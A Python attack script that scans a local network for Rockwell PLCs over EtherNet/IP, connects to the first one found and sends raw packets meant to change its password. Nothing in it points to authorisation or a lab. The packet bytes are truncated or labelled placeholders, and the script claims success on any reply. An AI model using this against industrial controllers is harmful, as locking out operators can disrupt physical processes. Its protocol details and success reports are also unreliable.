import socket
import struct
import time

# EtherNet/IP Port
PLC_PORT = 44818

def find_rockwell_plcs():
    """
    Scan the network for Rockwell PLCs using EtherNet/IP communication.
    """
    print("[*] Scanning for Rockwell PLCs...")

    # Create a UDP broadcast packet to discover EtherNet/IP devices
    discover_msg = bytes.fromhex("63 00 00 00 00 00 00 00 00 00 00 00 00 00")

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.settimeout(3)
    s.sendto(discover_msg, ('255.255.255.255', PLC_PORT))

    try:
        while True:
            data, addr = s.recvfrom(1024)
            if data:
                print(f"[+] Found Rockwell PLC at {addr[0]}")
                return addr[0]
    except socket.timeout:
        print("[-] No Rockwell PLC found.")
        return None

def update_plc_credentials(plc_ip):
    """
    Modify credential settings using EtherNet/IP CIP write commands.
    """
    print(f"[*] Attempting to change credentials on PLC at {plc_ip}...")

    # Create a socket to communicate with the PLC
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((plc_ip, PLC_PORT))

        # Enable session with Rockwell PLC
        enip_register_session = bytes.fromhex("65 00 04 00 01 00 00 00")
        s.send(enip_register_session)
        response = s.recv(1024)

        if response:
            print("[+] Connected to PLC. Attempting credential modification...")

            # Construct CIP Write service to modify password (Example SetPassword CIP service)
            cip_modify_password = bytes.fromhex("4B 01 03 01 12 34 56 78")  # Placeholder Hex Values

            s.send(cip_modify_password)
            response = s.recv(1024)

            if response:
                print("[+] Credentials modified successfully!")
            else:
                print("[-] Failed to modify credentials.")

    except Exception as e:
        print(f"[-] Error: {e}")

    finally:
        s.close()

if __name__ == "__main__":
    plc_ip = find_rockwell_plcs()
    if plc_ip:
        update_plc_credentials(plc_ip)